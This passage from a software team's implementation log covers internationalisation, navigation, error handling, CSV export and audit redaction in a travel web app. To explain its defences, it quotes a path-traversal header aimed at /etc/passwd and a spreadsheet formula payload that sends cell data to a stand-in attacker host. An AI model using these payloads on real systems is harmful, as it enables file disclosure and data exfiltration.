The night of 2026-03-29 in Europe/London is **23 hours long**. A journey from 22:00 the previous evening to 06:00 the next morning is eight hours on a wall clock and **seven in reality**. A 90-minute connection inside that window is a 30-minute one. `hoursInDay` returns 23, 24 or 25 rather than assuming; `elapsedHours` subtracts instants, which cannot be fooled by a clock that jumped. Both are tested against Europe/London **and** Australia/Sydney, where the transitions are reversed — a suite that only checks Europe encodes a northern-hemisphere assumption it never states.

### Two carried questions, resolved — and they were the same question
`STEP-003.02` left "the ICU message loading strategy interacts with server components" open, and §4 of this sub-step asked whether formatting runs server-side, client-side or both. Both are the hydration problem.

**The decision: every formatter takes `locale` and `timeZone` as required arguments and reads nothing ambient.** The usual mismatch is a server rendering in UTC and a browser re-rendering in its own zone; React reports it, and a user sees the time flicker to a different value. Passing both explicitly makes the two outputs identical by construction.

**The zone comes from the trip, not the reader.** A traveller checking their Tokyo itinerary from London wants Tokyo times. "The ferry leaves at 23:40 yesterday" is true and useless.

**Catalogues are plain data, resolved synchronously, passed in as values.** An async load inside a component makes every component that renders text a suspense boundary. A module-level "current locale" is shared mutable state on a server handling concurrent requests, and the failure mode is one user seeing another user's language — the same hazard `auth/context.py` designed out at STEP-002.02.

### `Accept-Language` is untrusted input
The naive locale loader is `import('./messages/' + locale)`. With `Accept-Language: ../../../../etc/passwd` that is a path traversal. The header is therefore only ever used to **select** from a statically-imported map, and never concatenated into anything; a miss is `undefined`, not a filesystem read. It is length-capped at 512 bytes before parsing, because a 2 MB header with fifty thousand q-weighted tags is a cheap way to spend server CPU on every request.

### Money is an integer count of minor units
`0.1 + 0.2 !== 0.3`, and currency arithmetic is mostly addition. Thirty ten-cent items summed as floats do not equal three euros. The representation is `{ amountMinor, currency }`; only formatting divides. **The exponent is not always 2** — JPY and KRW have none, BHD/KWD/TND have three, and hard-coding `/ 100` shows a Japanese price one hundred times too small.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` (16 guards + lint + typecheck + Python + tests + **build**) | **PASS** — 335 Python + 61 web + 256 UI |
| `pnpm ci:local` (Linux, clean checkout, cold install, `CI=true`) | **PASS** — and it rejected my first BUG-017 fix before it was pushed |
| Host-zone independence | **PASS** under UTC, Pacific/Auckland, America/Los_Angeles, Asia/Kolkata, Europe/London |
| Guard meta-suite | 40/40 |

**Mutation testing — 26 killed, 2 recorded as equivalent, 3 vacuous tests found and fixed.**

| Module | Result |
| --- | --- |
| `datetime.ts` | 6/6 killed — including dropping the second DST correction pass and ignoring the zone entirely |
| `money.ts` | 6 killed, **1 equivalent** (see below) |
| `messages.ts` | 5/5 killed, **after fixing two tests that passed for the wrong reason** |
| `apps/web/src/lib/i18n.ts` | 9 killed, **1 equivalent**; one vacuous test fixed |
| `logical-css.sh` | 5/5 killed, and the documented exemption honoured |

### Three tests that proved nothing, and one comment that was wrong
This is the part worth reading.

**`resolveLocale` — two tests passed for the wrong reason.** `resolveLocale('en-AU', ['fr', 'en'])` expected `'en'`, which is also the default fallback. Deleting the base-language branch entirely still returned `'en'`. The fix is to make the fallback a *different* language from the expected answer.

**The header length cap.** The flood was built from tags like `xx0`, `xx1` — which the shape check discards anyway, so removing the cap still produced `[]`. Rebuilt from well-formed tags, plus an assertion that the same tags *under* the cap are parsed, so the empty result is the cap and not the shape check quietly doing the work.

**My own comment in `parseMoney` was false.** It claimed `Math.round(1.005 * 100)` mis-parses to 100 minor units. That is true of the expression and irrelevant here: `1.005` has three decimals, so for EUR it is **rejected by the precision check before any multiplication**. I scanned every two-decimal value from 0.01 upward and magnitudes past `Number.MAX_SAFE_INTEGER` and found no accepted input where the two routes disagree. The mutant is recorded as **equivalent** rather than papered over with a contrived test, and the comment now says so. The string implementation stays because it is exact by construction rather than exact by empirical accident.

**A `?? {}` that could never be reached.** A missing catalogue would have rendered a page of raw message keys with no error anywhere — and the branch was unreachable, so it could not be tested either. Replaced with a load-time invariant that throws if the fallback locale has no catalogue, proven by renaming the catalogue key and watching the error appear. Same shape as the unreachable fail-closed branch found in `redaction.py` at STEP-002.07.

### A runtime check TypeScript could not give me
The first version of the "no ambient zone" test asserted that `formatDateTime` throws without a `timeZone`. **It did not throw.** `Intl.DateTimeFormat` treats `timeZone: undefined` as "use the system zone", so the failure was not an exception — it was a server silently rendering in whatever zone the container happened to have. TypeScript makes the argument required and that is worthless at the package boundary, where JavaScript consumers, `any` from a fetch, and optional fields two layers up all arrive as `undefined`. `assertZone` now rejects an absent zone **and** a misspelled one, because `Europe/Londn` must never quietly become the system default.

### The performance cost, stated rather than hidden
`headers()` in the root layout opts every route out of static rendering — the build output now marks all seven routes `ƒ (Dynamic)`. That is free today, because the only page is already `force-dynamic` for session cookies, and it stops being free when STEP-007 adds cacheable pages. The migration is a `/[locale]/` path segment, and it is written into `layout.tsx` rather than left to be rediscovered.

### RTL is enforced at the source, not tested at the surface
Physical properties (`left`, `margin-left`) and logical ones (`inset-inline-start`, `margin-inline-start`) render **identically** in the LTR locale everyone develops in. No unit test catches the difference; it appears only in a language nobody on the team reads. So `tests/guards/logical-css.sh` fails the build on any physical directional property, with a same-line `rtl-exempt: <reason>` escape hatch that is reviewable because it must state why.

### A pre-existing broken production build — BUG-017
`pnpm --filter @journeylab/web build` failed at `bb943f9`, before any change here. Confirmed by stashing the working tree and rebuilding at HEAD: identical failure. Next's own type-check step loads the TypeScript **compiler API**, which TypeScript 7 (ADR-009) does not ship, so Next decides TypeScript is missing, "installs" it, and then crashes with an error naming nothing that is actually wrong.

Nothing in `pnpm verify` or CI ran `next build`, which is why it sat undetected.

**My first fix was wrong, and the CI mirror is the only reason that is known.** `ignoreBuildErrors: true` made the build pass locally, so I committed it. `pnpm ci:local` failed on the next run: that flag does not gate the probe, it only decides whether the *result* is enforced. Locally the auto-install branch stumbled through; under `CI=true` the same probe aborts with the single word `Failed`. One defect, two symptoms, and only one visible where I was looking.

The real fix is `@typescript/native-preview` as a pinned **marker** devDependency — Next 16 has an explicit branch that skips its check when that package resolves. Nothing imports it, and `tsc` still resolves to 7.0.2 (native-preview's binary is `tsgo`). `ignoreBuildErrors` stays, for an unobvious reason: without it the build prints *"Running TypeScript … Finished TypeScript in 75ms"* having checked nothing, and a green message for work that did not happen is worse than an honest "Skipping validation of types".

`pnpm build` is now part of `verify`, which protects its own fix: remove the marker and `verify` fails.

### What is NOT met
**RTL implementation** — explicitly Phase 2, and out of scope by the sub-step's own boundary. What is delivered is the precondition: logical properties everywhere, enforced.

**Translation content** — also out of scope. One catalogue ships, and the machinery around it is the deliverable.

**Real-browser RTL rendering.** The RTL test asserts structure in jsdom, which does not lay anything out. Binds at STEP-003.08 with the other browser-dependent checks.

### Follow-ups
| Item | Owner step |
| --- | --- |
| `/[locale]/` routing to restore static rendering | STEP-007 |
| Real-browser RTL and touch-target verification | STEP-003.08 |
| Cross-package impact is invisible to the graph (`workspace:*` not followed) | STEP-026 |
| Trip-supplied time zone replacing the UTC default | STEP-009 |

---

## IMPL-020 — STEP-003.06 — Role-aware desktop and mobile navigation

| Field | Value |
| --- | --- |
| Date | 2026-08-10 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001, REQ-SEC-004 |
| Blast radius | [BR-023](blast-radius/BR-023-navigation.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `94bf916` — matched HEAD at pre-change |

### What was built
`packages/ui/src/nav/` — `navigation.tsx` and a **generated** `authz-matrix.ts`; `tools/gen_authz_matrix_ts.py`; navigation wired into the shell header. 21 tests (220 in the package).

### ADR-012's review trigger fired, and its prediction held
That ADR said the frontend would eventually need the matrix in TypeScript, that it must be **generated from the same markdown**, and that the shared parser made a second emitter additive. All three were correct: `gen_authz_matrix_ts.py` reuses `parse_matrix()` unchanged and the Python emitter was not touched.

Two hand-maintained copies of an authorization matrix diverge, and the divergence is silent — the menu starts offering something the server refuses, or hiding something it permits, and neither is visible from either file alone.

### Why the security tests matter more than the rendering ones
The sub-step says it plainly: *"a hidden nav item with an open endpoint is a vulnerability, not a UI bug."* So the tests establish two separate things:

1. **Hiding matches the server** — every operation × every role, not a sample.
2. **Hiding is not relied upon, and cannot become a control by accident.** The function is `visibleItems`, not `permittedItems`. A test asserts it contains no `fetch`, `redirect` or `throw`, that the `href` survives filtering, and that the module says so in plain words.

The last of those looks like testing a comment, and is deliberate. The comment is the only thing standing between a future reader and the assumption that the menu protects the route.

### Other decisions
**`aria-current="page"`, and the CSS styles from that attribute** rather than a separate class. One source, so the visual state cannot say something different from what a screen reader announces.

**44×44 touch targets**, not the 24×24 that WCAG 2.2 AA requires. The difference between technically-compliant and usable with a thumb on a moving train — which is where a traveller uses this.

**Role hard-coded to `guest`** in the shell until the session provider lands. Guest sees the least, so the placeholder cannot accidentally reveal an item.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 220 UI |
| Live render | `<nav aria-label="Main navigation">`; guest sees no `/admin/` links; zero errors |
| Guard meta-suite | 36/36 |

**Mutation testing — 5/5 killed:** role filtering removed, `aria-current` dropped, drawer focus trap removed, `aria-expanded` hard-coded, and an unknown pairing shown instead of hidden.

### What is NOT met
**"Directly requesting a hidden route is denied server-side."** No routes exist — `/admin/*` and `/trips` are not pages, and no endpoint enforces anything until STEP-004. The policy itself is proven at STEP-002.03 across 176 cells, but that is a unit test of the decision function, not a request to a route. Recorded unmet rather than counted as covered by the policy tests.

### Surprises
**Biome's `useValidAriaRole` fired on a React prop named `role`.** It reads `role="guest"` on a component as the HTML ARIA attribute. That is a false positive — but the collision is real for human readers too, so the prop became `actorRole` rather than adding a suppression. Given I had just added two suppressions that suppressed nothing, biasing away from them was the right instinct.

**The blanket rename then caught a loop variable of the same name**, breaking two assertions. A regex rename is not a refactor; typecheck caught it immediately.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Server-denial test against real routes | STEP-004 |
| Touch-target and breakpoint verification in a browser | STEP-003.08 |
| Session provider to replace the hard-coded `guest` | STEP-004 |

---

## IMPL-019 — STEP-003.05 — Application frame, providers and global error boundary

| Field | Value |
| --- | --- |
| Date | 2026-08-07 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001, REQ-NFR-013 |
| Blast radius | [BR-022](blast-radius/BR-022-app-shell.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `b09a0a2` — matched HEAD at pre-change |

### What was built
`packages/ui/src/shell/` (error boundaries, skip link, locale direction) and a real `apps/web` frame replacing the STEP-002.05 scaffold. 20 tests (199 in the package).

### Why this approach
**The unit of error containment is the FEATURE, not the app.** Blueprint §8.114 requires that a map or chart failure not remove itinerary text. A single root boundary satisfies the opposite: it turns one component's failure into a blank page. So `FeatureErrorBoundary` sits *between* siblings, and a test asserts that when the map throws, "Day 1: ferry to the island" and "Day 2: coastal walk" are both still on screen.

**The error message is never rendered.** An `Error.message` can carry a URL, a stack frame or a provider response. A test throws `ECONNREFUSED https://provider.internal/key=abc123` and asserts neither the host nor the key reaches the DOM; the detail goes to `onError` for reporting.

**Feature boundaries do not use `role="alert"`; the global one does.** Interrupting the user is wrong when the point of containment is that the rest of the page still works — and right when there is nothing left to interrupt.

**Provider order is documented because the sub-step flagged it.** Outermost-in: global boundary → locale → session → query/data. The rule that falls out is worth stating plainly: **nothing that fetches sits above the session.** A client cache keyed without a session can serve one tenant's data to another — the client-side form of the hazard `REQ-SEC-002` names for server caches.

**`lang` and `dir` are derived together.** A mismatched pair (`lang="ar"` with `dir="ltr"`) is worse than either alone, and that mismatch is exactly what a hand-maintained setting drifts into.

**The skip link is first in the document and its target carries `tabIndex={-1}`.** Browsers differ on whether `href="#id"` moves focus or only scrolls; without the target being programmatically focusable, the link scrolls and leaves focus where it was — looking like it worked.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 199 UI |
| Live render against the dev server | Three landmarks; **skip link first focusable in body**; `lang="en" dir="ltr"`; zero errors |
| Guard meta-suite | 36/36 |

**Mutation testing — 5/5 killed:** boundary re-throwing instead of containing, error message rendered to the user, feature boundary using `role="alert"`, recovery performed automatically, and direction hard-coded to LTR.

### What is NOT met
**CWV budgets.** `FRONTEND_ARCHITECTURE` §7 sets LCP ≤ 2.5 s, INP ≤ 200 ms, CLS ≤ 0.1. None is measurable in jsdom — they need a real browser and Lighthouse, which arrive at STEP-003.08. The shell is small and static and *likely* passes; likely is not measured, so the criterion is recorded unmet.

### Two architectural problems this surfaced
**`.ts`/`.tsx` import specifiers made the package unusable.** They require every *consumer* to enable `allowImportingTsExtensions`; `apps/web` does not, and Next's bundler rejects them outright. Every relative import in `packages/ui` is now extensionless.

**Seven modules needed `'use client'`.** Anything using hooks or class lifecycle cannot render on the server. Neither problem was visible while `packages/ui` was only consumed by its own tests — they appeared the moment a real application imported it.

### Surprises
**A dead suppression comment again.** Biome reported a `biome-ignore` in `providers.tsx` for a rule that never fires — the second in two sub-steps. That is a pattern in my own work, not bad luck: I am adding them pre-emptively rather than in response to a rule that actually fires, and each one teaches the next reader that a constraint exists where it does not.

**The same JSX syntax error twice.** Placing a comment beside the root element of a `return` is invalid, and I did it in `.04` and again here. Rationale belongs in the doc comment.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Measure CWV against §7 budgets | STEP-003.08 |
| Locale, session and query providers | STEP-003.07, STEP-004 |
| Error reporting sink for `onError` | STEP-024 |
| Skip-link visibility on focus in a real browser | STEP-003.08 |

---

## IMPL-018 — STEP-003.04 — Table, list and CSV export

| Field | Value |
| --- | --- |
| Date | 2026-08-07 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-002 (also REQ-A11Y-003) |
| Blast radius | [BR-021](blast-radius/BR-021-table-list-csv.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `c358d4b` — matched HEAD at pre-change |

### What was built
`packages/ui/src/data/` — `table.tsx` (DataTable, DataList) and `csv.ts`. 27 tests (179 in the package).

### Why this approach
**Virtualisation must not lie about size.** Rendering 20 of 10,000 rows is how a table stays fast, and it is also how a screen reader comes to announce "row 3 of 20" — telling the user the dataset is 500 times smaller than it is, with no way to discover otherwise. `aria-rowcount` on the table and `aria-rowindex` on each row carry the true totals independently of the DOM, so a virtualised row 4,001 announces itself as 4,001. Both are computed from the full set; the window is a rendering concern only.

**No virtualisation library was adopted.** The sub-step warns that they "frequently break AT row counts", so `virtualWindow` is a plain prop: the caller picks the slice, the component keeps the ARIA contract correct regardless. Any library adopted later must pass these tests, which now exist first.

**CSV export is a security surface, not a formatting convenience.** A cell starting `=`, `+`, `-`, `@`, tab or CR is executed as a formula by Excel, LibreOffice and Sheets. A trip note reading `=HYPERLINK("https://evil.example/?d="&A1,"Click me")` exfiltrates the adjacent cell when a colleague opens the shared file. The attacker never touches our servers — they type into a field we faithfully export.

Our data makes this worse than average: briefs and comments are free text, and exports are meant to be shared. Dangerous cells are prefixed with `'`, which spreadsheets render as literal text — the value survives, the execution does not.

**Export uses the full sorted set, never the rendered window.** Exporting what happens to be on screen hands the user a silently truncated file. Asserted with a 500-row dataset and a 10-row window.

**`aria-sort` on the sorted column only.** Setting `"none"` on every other header is noise a screen reader announces on each cell.

**The list keeps every header attached to its value** via a definition list. A responsive table that drops headers on small screens conveys strictly less than the wide one, which `REQ-A11Y-002` does not permit.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 179 UI |
| axe, WCAG 2.2 AA | Zero violations: table, list, empty table, virtualised table |
| Guard meta-suite | 36/36 |

**Mutation testing — 6/6 killed:** `aria-rowcount` reporting the window, `aria-rowindex` restarting per window, the formula-injection defence removed, export truncated to the window, `scope` dropped from headers, and `aria-sort="none"` on every column.

### Surprises
**A suppression comment that suppressed nothing.** Biome reported that my `biome-ignore` in `dialog.tsx` had no effect — the rule never fired there. Removed rather than left in place: a suppression claiming a rule applies where it does not teaches the next reader to trust a constraint that is not there.

**Biome preferred `<section>` to `role="region"`**, and was right — a native element carries the role implicitly and cannot lose it to a typo. Fixing it, I put a JSX comment before the root element of a `return` and broke the parse; the rationale moved to the doc comment where it belongs.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Real windowing (measurement, scroll sync) | STEP-011, first large dataset |
| Arrow-key grid navigation, if a dataset needs it | Deferred — a native table is already navigable by screen-reader table commands |
| Verify any virtualisation library against these row-count tests | Before adopting one |

---

## IMPL-017 — STEP-003.03 — Feedback primitives: dialog, notification, empty, error, skeleton

| Field | Value |
| --- | --- |
| Date | 2026-08-07 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001, REQ-A11Y-004 (also REQ-EVID-005, REQ-CONS-005, REQ-NFR-003) |
| Blast radius | [BR-020](blast-radius/BR-020-feedback-primitives.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `b28bf15` — matched HEAD at pre-change |

### What was built
`packages/ui/src/feedback/` — 45 tests (152 in the package).

| File | Role |
| --- | --- |
| `states.ts` | The nine mandatory states as data, with icon, label and politeness |
| `dialog.tsx` | Focus trap, restoration, Escape |
| `panels.tsx` | One component per state, plus `Progress` |
| `notification.tsx` | Toast with required politeness; always-mounted regions |

### Why this approach
**The nine states are data, so "all nine" is checkable.** FRONTEND_ARCHITECTURE §4 mandates a specific list and the acceptance criterion says all nine must exist. A list in a comment cannot be verified; a test compares the declared set against the required one.

**Three requirements are enforced by making the wrong thing unconstructible**, rather than discouraged in a style guide nobody re-reads:

- `Progress` requires both a `label` and an `onCancel`. `REQ-NFR-003` forbids a silent spinner — so a bare spinner cannot be built.
- `InfeasibleState` **throws** on an empty conflict set. `REQ-CONS-005` requires a minimal conflict set, never a bare failure; an empty panel would be the uninformative dead end the requirement exists to prevent.
- `StaleDataState` requires `subject` and `observedAt`. `REQ-EVID-005` wants staleness at the point of use, so this component cannot be rendered as a page-level "some data may be out of date" — there is no way to construct it without naming the thing and the time.

**Assertive politeness is rationed.** Only `infeasible`, `unauthorized` and `offline` interrupt. Interrupting someone mid-sentence is justified only when what they are reading is wrong; everything else waits for a pause. A test pins that exact set, so widening it is a deliberate act.

**`UnauthorizedState` offers no retry and names nothing.** Retrying cannot grant permission, and offering it implies it might. More importantly, STEP-002.02 made denial and absence indistinguishable at the API — a panel saying "you lack permission for trip 4821" would undo that at the last hop. A test asserts the text leaks none of *forbidden*, *permission*, *not found*, *exists*, *tenant*.

**Notifications never auto-dismiss.** WCAG 2.2.1 requires time limits to be adjustable; a toast that vanishes on a timer is unreadable to anyone using a screen reader, magnification, or simply reading slowly. Both live regions are mounted before any message exists, because a region created when content arrives is frequently never announced.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 152 UI |
| axe, WCAG 2.2 AA tags | Zero violations on all ten primitives plus the dialog |
| Guard meta-suite | 36/36 |

**Mutation testing — 6/6 killed:** focus never restored, focus trap removed, Escape disabled, infeasible accepting an empty conflict set, a quality state dropped, and progress losing its cancel control.

### The bug worth recording
**The focus trap was silently inert.** My visibility filter used `element.offsetParent !== null`. jsdom computes no layout, so that is *always* null — the filter returned an empty list and the trap did nothing. Three tests failed immediately.

It would also have been wrong in a real browser: `offsetParent` is null for `position: fixed` elements, which is what a dialog usually is. So the jsdom failure exposed a genuine defect rather than an environment quirk. Replaced with checks on `hidden`, `aria-hidden` and `inert`, none of which need layout.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Validate streamed-update politeness with a real screen reader | STEP-003.08 / STEP-011 |
| Icon set behind the `data-icon` names | STEP-003.04 / .05 |
| Feature error boundaries (map/chart failure must not remove itinerary text) | STEP-013 |

---

## IMPL-016 — STEP-003.02 — Form and input primitives with validation states

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001 |
| Blast radius | [BR-019](blast-radius/BR-019-form-primitives.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `0e3ea40` — matched HEAD at pre-change |

### What was built
`packages/ui/src/form/` — the repository's first components. 39 new tests (107 in the package).

| File | Role |
| --- | --- |
| `field.tsx` | Label, description and error association; the polite live region |
| `inputs.tsx` | TextInput, NumberInput, DateInput, Select, Checkbox, RadioGroup |
| `locale-number.ts` | Separator-aware parsing that refuses ambiguity |
| `zoned-date.ts` | Calendar dates and explicit-zone conversion |

### Why this approach
**Association is centralised so it cannot be forgotten.** Getting label, description and error wiring right once is easy; getting it right on the fourteenth form is not. Every primitive routes through `Field`, so a component author cannot ship an input whose error is invisible to a screen reader.

**Errors are polite, and focus never moves.** `aria-live="polite"`, not `role="alert"` — assertive interrupts the user mid-sentence, which for someone still typing means being cut off about a field they have not finished. And the region is rendered *always*, not inserted when an error appears: a live region created at the moment it gains content is frequently never announced, because the screen reader must already be observing the node.

**`Number.parseFloat` is wrong for user input.** `parseFloat("1.234,56")` returns **1.234** — off by three orders of magnitude, silently. Separators come from `Intl.NumberFormat` per locale, and genuinely ambiguous input like `"1,23"` is **refused** rather than guessed, because guessing is wrong half the time.

**`type="text"` with `inputMode="decimal"`, not `type="number"`.** A native number input silently discards characters the browser dislikes, so a German user typing `1.234,56` can lose part of what they typed with no feedback.

**Dates carry no implicit zone.** `DateInput` hands back a `CalendarDate`, never a `Date`. A `Date` is an instant and a date input's value is not one; attaching the browser's zone is exactly the bug the sub-step warns "becomes an infeasible itinerary in STEP-012". `startOfDayUtc` requires an IANA zone with no default, and probes the offset rather than assuming it, so DST boundaries do not drift an hour.

**Disabled and read-only are kept distinct.** `disabled` removes the control from the tab order, excludes it from submission, and in several screen readers makes it unreadable — the user cannot discover what the field was. `readOnly` keeps it focusable and readable. "You cannot change this right now, but here is its value" is almost always read-only.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 107 UI |
| axe, WCAG 2.2 AA tags | Zero violations on all six primitives |
| Guard meta-suite | 36/36 |

**Mutation testing — 5/5 killed:** live region made assertive, `aria-describedby` dropping the error, label disassociated, read-only implemented as disabled, and `NumberInput` reverted to `type="number"`.

### Biome caught two standards errors I had written
`aria-required` on `input[type=date]` — that input type has **no ARIA role**, so the attribute is unsupported on it. Moving it to a `<fieldset>` for the radio group was no better: a fieldset maps to `role="group"`, which does not support `aria-required` either, and forcing `role="radiogroup"` onto a non-interactive element trades one violation for another.

The correct answer in both cases was to stop reaching for ARIA. The native `required` attribute already maps to the same accessibility property, and per the HTML spec `required` on one radio makes its whole same-named group required. **Reaching for ARIA when HTML already says it is how elements end up over-annotated and less accessible, not more.**

### Surprises
**A mutant appeared to survive, and my harness had mutated a comment.** Flipping `aria-live="polite"` to `assertive` failed nothing — because the first textual occurrence of that string in `field.tsx` is inside the module docstring, not the JSX. Re-run against the actual attribute, two tests failed as they should.

Third time a mutation harness has misled me: once through a `ruff format` reflow, once through an apostrophe terminating a quoted block, now through a docstring. **A mutation that reports "survived" needs its own verification that it applied to code.**

**axe passing first time was itself suspicious**, so before trusting it I proved it fails on an unlabelled input and an image with no alt. Those two proofs are now permanent tests — without them, "zero violations" is indistinguishable from axe not running.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Resolve ICU message loading vs server components | Before STEP-003.07 |
| Real-browser verification (jsdom is not a browser) | STEP-003.08 |
| Assistive-technology testing beyond axe | STEP-003.08 |

---

## IMPL-015 — STEP-003.01 — Design tokens including high-contrast and reduced-motion

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-004, REQ-NFR-013 |
| Blast radius | [BR-018](blast-radius/BR-018-design-tokens.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `9f5ff36` — matched HEAD at pre-change |

### What was built
`packages/ui/` — the first design-system package. 68 tests.

| File | Role |
| --- | --- |
| `src/tokens.ts` | Source of truth: three palettes, scales, motion, status tokens |
| `src/tokens.css` | **Generated** custom properties with media queries |
| `src/contrast.ts` | WCAG 2.2 relative-luminance and contrast-ratio maths |
| `tools/gen-tokens.ts` | Generator; drift-gated by a test |

### Why this approach
**Accessibility claims are computed, not asserted.** "These colours pass AA" is something someone checked once, in a tool, against values that have since been edited. Every declared foreground/background pairing has its ratio computed from the token values on every test run, so a colour edited below the bar breaks the build.

The contrast maths is itself verified against published values first — black on white is 21:1, `#767676` on white is 4.54:1. If that function were wrong, every other assertion would be meaningless.

**A colour on its own has no contrast**, so foregrounds are declared *alongside* the backgrounds they may appear on. A test then fails on any colour token with no declared pairing, because such a token is unverifiable.

**Non-text UI is held to 3:1, not 4.5:1** — WCAG 2.2 SC 1.4.11. Borders and focus rings would otherwise be over-constrained into ugliness for no accessibility gain.

**High contrast is a distinct palette held to AAA**, not dark mode intensified. A test asserts it differs from the dark palette, because the lazy implementation is to alias them.

**Reduced motion suppresses rather than shortens.** The sub-step called this vestibular safety, not a preference. Every duration is exactly `0ms` and the test asserts `toBe("0ms")` rather than "shorter than default" — a 60ms animation still moves, and movement is what triggers vertigo. A `!important` catch-all also neutralises any component that hard-codes its own duration.

**Both `prefers-contrast` and `forced-colors`.** Windows High Contrast Mode signals only the latter; handling just `prefers-contrast` would strand exactly the users who most need it.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 68 UI |
| Typecheck | Both packages, own configs |
| Module boundaries | 25 files |
| Guard meta-suite | 36/36 |

**Mutation testing — 5/5 killed:** secondary text lightened below AA, a status losing its icon, reduced motion shortened to 60ms instead of suppressed, `forced-colors` support dropped, and a font size hard-coded in px.

### The bug worth recording
**The drift test was self-repairing.** `tokens.css` is generated, and the test imports the generator to compare its output against the committed file. But the generator wrote the file at module top level — so importing it *rewrote the very file the test was about to check*. It could never have failed.

Visible only as a stray `wrote src/tokens.css` line in the test output. The write is now guarded behind a direct-invocation check, and a hand-edited `tokens.css` was confirmed to break the suite.

**A test that repairs the thing it verifies proves nothing.** Same family as `BUG-001`'s self-truncating guard and the mutation harness that mutated nothing.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Lint rule forbidding hard-coded values components should take from tokens | STEP-003.02 |
| Real-browser `forced-colors` verification | STEP-003.08 |
| Confirm the chart library honours token theming | Before STEP-013 |

---

## IMPL-014 — STEP-002.07 — Audit event emission and runtime flag primitives

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-007, REQ-PLAT-012 |
| Blast radius | [BR-017](blast-radius/BR-017-audit-and-flags.md) (**HIGH**) |
| Commit | see git log for this entry |
| Graph indexed commit | `d7d71cf` — matched HEAD at pre-change |

### What was built
Migration 002 (`audit_events`, `feature_flags`) and `services/audit/` — `audit.py`, `redaction.py`, `flags.py`. 29 tests; 335 Python tests total.

This closes the gaps carried since `.03` and `.04`: `provisioning` has been returning `AuditRecord` and `authz` returning `Decision.audit` with nothing to receive them. `impact(AuditRecord)` confirmed it — two consumers, **both tests**.

### Why this approach
**Append-only is a privilege, not a convention.** The sub-step asks that "no update or delete path exists in code". Code can be changed; a privilege cannot be talked around. `journeylab_app` holds INSERT and SELECT on `audit_events` and nothing else, so `UPDATE`, `DELETE` and `TRUNCATE` all return `permission denied` — verified against the live database, not asserted.

**Redaction at emission, never at query time.** Redacting on read means the raw value was already durably stored and every backup, replica and psql session has it. Redacting at emission means it was never written.

**Redaction failure blocks the write.** There is no `force=True`. This matters more here than anywhere else: the store is append-only, so a leaked secret could not be deleted afterwards.

**`conservative` is a required argument on every flag, with no default.** A default would be a guess about which direction is safe, and it differs per flag — `new_solver_ui` is conservatively `False`, `require_consent` is conservatively `True`. The sub-step named the trap: "a flag service outage that enables a half-built feature is a far worse outcome than one that disables a finished one." A flag whose author has not decided which way is safe cannot be evaluated.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 TypeScript |
| Shell R7 | **12/12** |
| Isolation suite | 14 passed, 5 pending |
| Guard meta-suite | **36/36** |
| Migration 002 idempotent | Re-applied with 0 errors |
| Append-only | `UPDATE`/`DELETE`/`TRUNCATE` → `permission denied` |

**Mutation testing — 4/4 killed:** flags failing open on an outage, the redaction sweep removed, an audit write failure swallowed, and a malformed flag value coerced generously.

### Two real defects, found by tests rather than review
**`PRIMARY KEY (key, organization_id)` made the design impossible.** Primary key columns are implicitly `NOT NULL`, so the NULL-means-global row could never be inserted — the flag tests failed with a not-null violation. Replaced with a surrogate key plus two **partial** unique indexes, which also fixes a subtler problem: `(key, NULL)` is not unique under SQL NULL semantics, so two global rows for one key could have coexisted and made evaluation non-deterministic.

**A tuple containing a private key passed through `redact()` completely untouched.** `_redact_value` understands dict, list and str; a tuple fell through unchanged, and the safety sweep did not traverse tuples either. **The fail-closed branch was unreachable — decorative rather than protective.** The sweep now checks the string form of any type it does not understand, and a test proves it.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Wire emitters into request paths | STEP-004 |
| Audit volume and write-failure monitoring | STEP-024 |
| Admin console for flag changes | STEP-021 |
| Retention policy (needs `DEC-007`) | STEP-027 |

---

## IMPL-013 — STEP-002.06 — Cross-tenant isolation test suite

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-002 |
| Blast radius | [BR-016](blast-radius/BR-016-tenant-isolation-suite.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `2687bbe` — matched HEAD at pre-change |

### What was built
`tests/security/test_tenant_isolation.py` — 19 tests: 14 active, 5 pending. R7 now runs in pytest (the fast tier) as well as the shell suite from STEP-002.01.

| Vector | Coverage |
| --- | --- |
| Storage | Cross-tenant read, write and unbound listing all denied |
| Authorization | **Every operation × every role** against a foreign resource — 198 combinations, not sampled |
